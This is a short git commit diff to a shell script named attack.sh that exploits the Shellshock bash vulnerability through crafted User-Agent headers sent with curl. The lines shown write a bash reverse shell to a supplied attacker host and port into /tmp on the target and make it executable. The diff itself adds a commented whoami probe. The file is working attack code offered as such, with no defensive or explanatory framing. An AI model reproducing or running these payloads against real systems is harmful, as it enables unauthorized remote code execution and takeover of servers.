1aef39f335b6e17bc77fbc42c4aa233ea8923dd4
ap <ap@laptop.ap.local>
2021-09-26 13:13:58 +0200

    commit

--- attack.sh
+++ attack.sh
@@ -3,6 +3,9 @@ APP_URL="$1"
 REVERS_HOST="$2"
 REVERS_PORT="$3"
 
+
+# curl -A "() { :; }; echo \"Content-type: text/plain\"; echo; /usr/bin/whoami" ${APP_URL}
+
 curl -A "() { :; }; echo \"Content-type: text/plain\"; echo; echo \"bash -i >& /dev/tcp/${REVERS_HOST}/${REVERS_PORT} 0>&1\" > /tmp/revers.sh" ${APP_URL}
 
 curl -A "() { :; }; echo \"Content-type: text/plain\"; echo; /usr/bin/chmod +x /tmp/revers.sh" ${APP_URL}
